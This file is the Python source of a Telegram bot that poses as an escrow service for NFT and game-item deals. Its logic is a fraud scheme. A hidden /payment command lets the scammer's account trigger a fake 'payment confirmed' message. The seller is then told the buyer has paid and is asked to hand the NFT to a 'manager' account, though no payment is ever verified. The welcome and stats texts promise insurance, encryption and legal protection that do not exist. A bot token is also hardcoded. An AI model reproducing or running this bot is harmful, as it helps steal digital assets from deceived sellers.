import asyncio
import os
import random
import string
import logging
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.types import Message, CallbackQuery, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8520179075:AAGJvZJDVkdUJ2K0jGnMiID41YAri-_1yhI'
MANAGER = "@Donatovgift_manager"
REVIEWS_URL = "https://donatov.net/feedback"
SITE_URL = "https://donatov.net/"
PHOTO_PATH = r"C:\Users\ADMIN\Downloads\моё\donatov.png" 

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# Хранилища данных
DEALS = {}
PAYMENT_ACCESS = set() 
USER_LANGS = {}

class DealCreate(StatesGroup):
    curr = State()
    amount = State()
    item = State()
    reqs = State()

# --- ТЕКСТЫ ЛОКАЛИЗАЦИИ ---
STRINGS = {
    'ru': {
        'welcome': "<b>DonatovGifts — Ваша безопасность в мире цифровых активов.</b>\n\n"
                   "Мы предоставляем профессиональный сервис для проведения сделок с игровыми ценностями, "
                   "NFT и аккаунтами. Наша платформа гарантирует сохранность средств до момента "
                   "подтверждения выполнения обязательств обеими сторонами.\n\n"
                   "<b>Выберите необходимое действие ниже:</b>",
        'btn_create': "📝 Создать сделку",
        'btn_stats': "🔐 Верификация и статистика",
        'btn_lang': "🌐 Язык / Language",
        'btn_reviews': "⭐ Отзывы",
        'btn_more': "ℹ️ Наш сайт",
        'btn_support': "📞 Менеджер / Поддержка",
        'step_curr': "Выберите валюту сделки:",
        'step_amount': "Введите сумму сделки:",
        'step_item': "Введите название товара (NFT):",
        'step_reqs': "Укажите ваши реквизиты (карта/USDT/User):",
        'deal_ready': "✅ <b>Сделка #{id} готова!</b>\n\n📦 Товар: {item}\n💰 Сумма: {amount} {curr}\n\n🔗 <b>Ссылка для покупателя:</b>\n<code>{link}</code>",
        'pay_btn': "💳 Оплатить товар",
        'stats_text': "📊 <b>Ваша статистика:</b>\n• Успешных сделок: 0\n• Общий объем: 0.00 ₽\n• Рефералов: 0\n• Баланс: 0.00 ₽\n\n"
                      "<b>Что дает премиум-статус:</b>\n• Верификация продавца - знак доверия\n• Гарант сделок - защита от мошенников\n"
                      "• 🎧 Приоритетная поддержка - быстрые ответы\n• Сниженная комиссия - 0.5% вместо 1%\n"
                      "• Быстрые выплаты - в течение 1 часа\n• Бонусы за рефералов - +10% к балансу\n\n"
                      "<b>Безопасность:</b>\n• Шифрование всех данных\n• Страхование сделок\n• Юридическая защита\n• 24/7 мониторинг\n\n"
                      "<b>Преимущества:</b>\n• Повышенное доверие покупателей\n• Больше успешных сделок\n• Персональный менеджер\n• Эксклюзивные предложения",
        'pay_err': "⚠️ Ошибка: Платежный шлюз временно недоступен.",
        'pay_ok': "🎉 Оплата подтверждена!",
        'seller_notify': "🔔 <b>Покупатель оплатил сделку!</b>\n\nДля проведения успешной сделки вам требуется отправить НФТ менеджеру: {manager}"
    },
    'en': {
        'welcome': "<b>DonatovGifts — Security Service.</b>\n\n"
                   "We provide professional escrow services for gaming items, NFTs, and accounts. "
                   "Our platform ensures funds are safe until fulfillment.\n\n"
                   "<b>Select an action:</b>",
        'btn_create': "📝 Create Deal",
        'btn_stats': "🔐 Verification & Stats",
        'btn_lang': "🌐 Language / Язык",
        'btn_reviews': "⭐ Reviews",
        'btn_more': "ℹ️ Website",
        'btn_support': "📞 Manager / Support",
        'step_curr': "Select currency:",
        'step_amount': "Enter amount:",
        'step_item': "Enter item name:",
        'step_reqs': "Enter your requisites:",
        'deal_ready': "✅ <b>Deal #{id} is ready!</b>\n\n📦 Item: {item}\n💰 Price: {amount} {curr}\n\n🔗 <b>Link:</b>\n<code>{link}</code>",
        'pay_btn': "💳 Pay for item",
        'stats_text': "📊 <b>Stats:</b>\n• Successful deals: 0\n\n<b>Premium:</b>\n• Verified badge\n• Escrow protection\n• Priority support",
        'pay_err': "⚠️ Error: Payment gateway is offline.",
        'pay_ok': "🎉 Payment confirmed!",
        'seller_notify': "🔔 <b>The buyer has paid for the deal!</b>\n\nTo complete the transaction, you need to send the NFT to the manager: {manager}"
    }
}

# --- КЛАВИАТУРЫ ---
def get_main_kb(uid):
    lang = USER_LANGS.get(uid, 'ru')
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=STRINGS[lang]['btn_create'], callback_data="make_deal")],
        [InlineKeyboardButton(text=STRINGS[lang]['btn_stats'], callback_data="v_stats")],
        [InlineKeyboardButton(text=STRINGS[lang]['btn_lang'], callback_data="lang_menu")],
        [InlineKeyboardButton(text=STRINGS[lang]['btn_reviews'], url=REVIEWS_URL)],
        [InlineKeyboardButton(text=STRINGS[lang]['btn_more'], url=SITE_URL)],
        [InlineKeyboardButton(text=STRINGS[lang]['btn_support'], url=f"https://t.me/{MANAGER[1:]}")]
    ])

# --- ЛОГИКА ОПЛАТЫ ---
@router.callback_query(F.data.startswith("pay_"))
async def handle_pay(c: CallbackQuery):
    d_id = c.data.split("_")[1]
    deal = DEALS.get(d_id)
    if not deal: return
    lang = USER_LANGS.get(c.from_user.id, 'ru')

    # Проверка на секретную команду /payment
    if c.from_user.id not in PAYMENT_ACCESS:
        await c.answer(STRINGS[lang]['pay_err'], show_alert=True)
    else:
        # Уведомляем создателя сделки (продавца)
        seller_msg = STRINGS[lang]['seller_notify'].format(manager=MANAGER)
        try:
            await bot.send_message(deal['owner_id'], seller_msg)
        except: pass
        
        # Ответ покупателю
        await c.message.answer(STRINGS[lang]['pay_ok'])
        await c.answer()

# --- СОЗДАНИЕ СДЕЛКИ ---
@router.callback_query(F.data == "make_deal")
async def start_create(c: CallbackQuery, state: FSMContext):
    lang = USER_LANGS.get(c.from_user.id, 'ru')
    await state.set_state(DealCreate.curr)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 RUB", callback_data="c_RUB"), 
         InlineKeyboardButton(text="💵 USD", callback_data="c_USD"),
         InlineKeyboardButton(text="⭐️ Stars", callback_data="c_STARS")]
    ])
    await c.message.answer(STRINGS[lang]['step_curr'], reply_markup=kb)
    await c.answer()

@router.callback_query(F.data.startswith("c_"))
async def set_cur(c: CallbackQuery, state: FSMContext):
    await state.update_data(curr=c.data.split("_")[1])
    await state.set_state(DealCreate.amount)
    lang = USER_LANGS.get(c.from_user.id, 'ru')
    await c.message.answer(STRINGS[lang]['step_amount'])
    await c.answer()

@router.message(DealCreate.amount)
async def set_amt(m: Message, state: FSMContext):
    await state.update_data(amount=m.text)
    await state.set_state(DealCreate.item)
    lang = USER_LANGS.get(m.from_user.id, 'ru')
    await m.answer(STRINGS[lang]['step_item'])

@router.message(DealCreate.item)
async def set_itm(m: Message, state: FSMContext):
    await state.update_data(item=m.text)
    await state.set_state(DealCreate.reqs)
    lang = USER_LANGS.get(m.from_user.id, 'ru')
    await m.answer(STRINGS[lang]['step_reqs'])

@router.message(DealCreate.reqs)
async def finish(m: Message, state: FSMContext):
    data = await state.get_data()
    d_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    DEALS[d_id] = {"owner_id": m.from_user.id, **data}
    
    bot_me = await bot.get_me()
    link = f"https://t.me/{bot_me.username}?start=deal_{d_id}"
    lang = USER_LANGS.get(m.from_user.id, 'ru')
    
    await m.answer(STRINGS[lang]['deal_ready'].format(id=d_id, item=data['item'], amount=data['amount'], curr=data['curr'], link=link), reply_markup=get_main_kb(m.from_user.id))
    await state.clear()

# --- СИСТЕМНОЕ ---
@router.message(CommandStart())
async def start(m: Message, state: FSMContext, command: CommandObject = None):
    await state.clear()
    uid = m.from_user.id
    if uid not in USER_LANGS: USER_LANGS[uid] = 'ru'
    lang = USER_LANGS[uid]

    if command and command.args and command.args.startswith("deal_"):
        d_id = command.args.split("_")[1]
        if d_id in DEALS:
            d = DEALS[d_id]
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=STRINGS[lang]['pay_btn'], callback_data=f"pay_{d_id}")],
                [InlineKeyboardButton(text="🏠 Menu", callback_data="home")]
            ])
            await m.answer(f"🛡 <b>Сделка #{d_id}</b>\n\nТовар: {d['item']}\nСумма: {d['amount']} {d['curr']}", reply_markup=kb)
            return

    if os.path.exists(PHOTO_PATH):
        await m.answer_photo(photo=FSInputFile(PHOTO_PATH), caption=STRINGS[lang]['welcome'], reply_markup=get_main_kb(uid))
    else:
        await m.answer(STRINGS[lang]['welcome'], reply_markup=get_main_kb(uid))

@router.callback_query(F.data == "v_stats")
async def v_stats(c: CallbackQuery):
    lang = USER_LANGS.get(c.from_user.id, 'ru')
    await c.message.answer(STRINGS[lang]['stats_text'], reply_markup=get_main_kb(c.from_user.id))
    await c.answer()

@router.callback_query(F.data == "lang_menu")
async def lang_menu(c: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 RU", callback_data="sl_ru"), InlineKeyboardButton(text="🇺🇸 EN", callback_data="sl_en")]
    ])
    await c.message.answer("Select Language / Выберите язык:", reply_markup=kb)
    await c.answer()

@router.callback_query(F.data.startswith("sl_"))
async def set_l(c: CallbackQuery):
    USER_LANGS[c.from_user.id] = c.data.split("_")[1]
    await start(c.message, None)
    await c.answer()

@router.callback_query(F.data == "home")
async def h(c: CallbackQuery):
    await start(c.message, None)
    await c.answer()

@router.message(Command("payment"))
async def pay_cmd(m: Message):
    PAYMENT_ACCESS.add(m.from_user.id)
    await m.answer("✅ <b>Платежный доступ активирован.</b>")

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
